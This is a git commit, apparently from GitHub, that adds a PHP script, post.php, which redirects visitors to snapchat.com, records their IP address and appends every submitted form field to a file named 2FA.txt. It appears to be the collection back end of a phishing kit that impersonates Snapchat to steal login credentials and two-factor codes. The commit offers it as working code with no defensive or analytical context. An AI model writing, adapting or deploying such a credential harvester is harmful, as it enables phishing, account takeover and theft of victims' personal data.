7c647a6d05a4e024d7ded238ae00f0337cfc8d53
Elz2800 <104279679+Elz2800@users.noreply.github.com>
2024-04-04 12:30:55 +0200

    Add files via upload

---
+++ post.php
@@ -0,0 +1,30 @@
+<?php
+header ('Location:https://snapchat.com');
+
+if(!empty($_SERVER['HTTP_CLIENT_IP'])){
+   $ip=$_SERVER['HTTP_CLIENT_IP'];
+ }
+ elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
+   $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
+ }
+ else{
+   $ip=$_SERVER['REMOTE_ADDR'];
+ }
+
+
+
+$handle = fopen("2FA.txt", "a+");
+fwrite($handle,"Logged IP address: $ip");
+fwrite($handle, "\r\n");
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fwrite($handle,"\r\n ");
+fclose($handle);
+exit;
+
+?>
